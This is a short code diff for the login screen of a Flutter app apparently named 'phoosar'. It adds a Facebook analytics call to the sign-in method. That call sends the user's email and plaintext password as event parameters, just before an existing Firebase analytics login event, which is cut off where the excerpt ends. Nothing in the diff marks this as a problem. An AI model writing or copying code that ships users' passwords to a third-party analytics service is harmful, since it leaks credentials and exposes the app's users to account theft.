@@ -28,6 +28,7 @@ import 'package:phoosar/src/providers/data_providers.dart';
 import 'package:phoosar/src/providers/profile_provider.dart';
 import 'package:phoosar/src/providers/profiles_provider.dart';
 import 'package:phoosar/src/providers/room_provider.dart';
+import 'package:phoosar/src/services/facebook_analytics_service.dart';
 import 'package:phoosar/src/utils/colors.dart';
 import 'package:phoosar/src/utils/constants.dart';
 import 'package:phoosar/src/utils/dimens.dart';
@@ -307,6 +308,13 @@ class _LoginScreenState extends ConsumerState<LoginScreen> {
   }
 
   Future<void> _signIn() async {
+    FacebookAnalyticsService.instance.logEvent(
+      name: "login",
+      parameters: {
+        "email": emailController.text,
+        "password": passwordController.text,
+      },
+    );
     await FirebaseAnalytics.instance.logEvent(
       name: "login",
       parameters: {
